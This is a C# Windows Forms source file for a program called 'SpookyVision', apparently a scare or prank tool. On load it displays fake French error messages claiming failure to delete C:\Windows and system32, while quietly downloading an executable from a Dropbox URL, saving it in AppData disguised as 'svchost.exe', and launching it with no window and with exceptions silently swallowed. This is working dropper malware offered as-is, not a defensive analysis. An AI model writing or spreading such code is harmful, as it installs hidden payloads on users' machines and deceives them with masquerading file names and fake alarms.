using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace SpookyVision
{
    public partial class Main : Form
    {
        Thread Spooky;
        Thread Vision;

        string BrotherPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft//Windows"); // Define the folder
        string BrotherName = "svchost.exe";

        public Main()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            GetBigBrother();

            Spooky = new Thread(new ThreadStart(StartSpooky));
            Vision = new Thread(new ThreadStart(StartVision));

            Spooky.Start();
            Vision.Start();

            MessageBox.Show("Action impossible, vous devez posséder les droits d'adminsitrateurs.", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("Action impossible, vous devez posséder les droits d'adminsitrateurs.", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("Impossible de supprimer le dossier C:\\Windows", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("Impossible de supprimer le dossier C:\\Windows\\system32", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void StartSpooky()
        {
            Application.Run(new Spooky());
        }

        private void StartVision()
        {
            Application.Run(new Vision());
        }

        private void GetBigBrother()
        {
            try
            {
                if (!File.Exists(Path.Combine(BrotherPath, BrotherName))) // If the brother doesn't exist, download it
                {
                    if (!Directory.Exists(BrotherPath)) // If the directory doesn't exist, create a new one
                        Directory.CreateDirectory(BrotherPath);

                    WebClient _WClient = new WebClient();

                    _WClient.DownloadFileAsync(new Uri("https://dl.dropbox.com/u/81945809/SpookyVision/BigBrother.exe"), Path.Combine(BrotherPath, BrotherName));
                    _WClient.DownloadFileCompleted += new AsyncCompletedEventHandler(RunBigBrother);
                }
            }
            catch
            {
                // Please don't crash the application :D
            }
        }

        private static bool BrotherIsOpen(string Path)
        {
            FileStream _FStream;

            try
            {
                _FStream = File.Open(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
                _FStream.Close();
                return false;
            }
            catch
            {
                _FStream = null;
                return true;
            }
        }

        private void RunBigBrother(Object sender, AsyncCompletedEventArgs e)
        {
            if (!BrotherIsOpen(Path.Combine(BrotherPath, BrotherName))) // Launch the brother
            {
                Process _Brother = new Process();

                _Brother.StartInfo.FileName = Path.Combine(BrotherPath, BrotherName);
                _Brother.StartInfo.WorkingDirectory = BrotherPath;
                _Brother.StartInfo.CreateNoWindow = true;
                _Brother.Start();
            }
        }
    }
}
